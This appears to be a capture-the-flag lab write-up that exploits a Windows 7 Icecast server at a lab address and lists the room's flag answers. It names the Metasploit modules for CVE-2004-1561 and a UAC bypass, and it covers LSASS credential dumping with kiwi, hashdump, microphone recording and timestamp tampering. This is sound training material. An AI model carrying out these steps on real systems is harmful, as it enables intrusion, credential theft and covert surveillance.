## Recon

The machine we'll be attacking is at 10.10.55.173. Since it's a Windows box, we know that it won't respond to `ping` by default.

As usual, we'll start out with an nmap scan:

```bash
sudo nmap -v -oA ice -Pn -A -T4 -sS -script vuln \
          -p- 10.10.55.173
```

Which gives us:

```

(An interesting effect of the -T4 flag, which uses a slightly more aggressive timing timing profile, is that port discovery seems to happen out-of-order...)

FLAG 1: What port is MSRDP open on? - 3389

FLAG 2: What service is running on port 8000? - Icecast streaming media server

FLAG 3: What is the hostname of the machine? - DARK-PC

## Gain Access

The next few flags are about finding a particular vulnerability for Icecast on https://cvedetails.com. There's actually a couple of different vulnerabilities that match the flag descriptions, but after a little trial-and-error we can find the right ones.

FLAG 4: What is a vulnerability impacting Icecast with a CVSS score of 7.5? - Execute Code Overflow

FLAG 5: What is the CVE number for the vulnerability in Flag 4? - CVE-2004-1561

FLAG 6: What is the Metasploit module for exploiting this vulnerability? - exploit/windows/http/icecast_header

FLAG 7: What option must be set to use this module? - RHOSTS

There's not too much to this module - set RHOSTS and LHOST, run, get shell.

## Escalate

FLAG 8: What shell does Metasploit provide us with? - meterpreter

We can find the current user using the `getuid` command.

FLAG 9: What user is running the Icecast process? - Dark-PC/Dark

The `sysinfo` command will give us the OS version and architecture.

FLAG 10: What is the build of this Windows system? - Windows 7 (6.1 Build 7601, Service Pack 1)

FLAG 11: What is the system architecture? - x64

We'll now use `run post/multi/recon/local_exploit_suggester` to find potential paths to elevating privileges.

Unfortunately, for me this only returns one result - `exploit/windows/local/ms10_092_schelevator` - which is not accepted as the 12th flag. The flag hint states that the exploit will contain `eventvwr`. A quick search through Metasploit shows that the only exploit including this string is `exploit/windows/local/bypassuac_eventvwr`, which *is* accepted.

FLAG 12: What is the potential exploit `run post/multi/recon/local_exploit_suggester` returns? - `exploit/windows/local/bypassuac_eventvwr`

We can background meterpreter with Ctrl+Z and then switch to this exploit using `use exploit/windows/local/bypassuac_eventvwr`. This exploit runs through an existing session, so we need to set this using `set SESSION 2`. (I'm on session 2 because I previously backed out an unsuccessfully tried to pop a 64-bit meterpreter shell - I guess Icecast is running as a 32-bit process.)

FLAG 13: What option needs to be set to ensure that our listener IP address is correct? - LHOST

I also tweaked LPORT, as I'm nervous about killing the existing session (which is running on the default port, 4444).

Using `run` quickly pops a new shell.

FLAG 14: What permission allows taking ownership of files? - SeTakeOwnershipPrivilege

## Looting

In order to harvest credentials from LSASS we'll need to migrate meterpreter to a process with the same permissions (NT AUTHORITY/SYSTEM) and architecture as LSASS. The print spooler service is a good choice, as it runs with elevated permissions, has the same architecture as the system itself, and will restart itself automatically.

FLAG 15: What is the name of the print spooler service? - `spoolsv.exe`

```meterpreter
migrate -N spoolsv.exe
```

FLAG 16: What user is the migrated meterpreter process running as after migration? - NT AUTHORITY/SYSTEM

We're going to loot LSASS now using Mimikatz.

```meterpreter
load kiwi
```

FLAG 17: What command retrieves all credentials from LSASS? - `creds_all`

It turns out that Windows loads *unhashed* passwords into LSASS for any users with scheduled jobs!

FLAG 18: What is Dark's password? - `Password01!`

## Past-Exploitation

FLAG 19: What meterpreter command allows us to dump all of the password hashes stored on the system? - `hashdump`

Hashes dumped using `hashdump` can be cracked offline using Hydra or John the Ripper.

FLAG 20: What meterpreter command allows us to watch the remote user's desktop in real time? - `screenshare`

FLAG 21: What meterpreter command allows us to record using the system's microphone? - `record_mic`

FLAG 22: What meterpreter command can modify timestamps of files on the system? - `timestomp`

FLAG 23: What meterpreter/`kiwi` command allows for the creation of a golden ticket? - `golden_ticket_create`
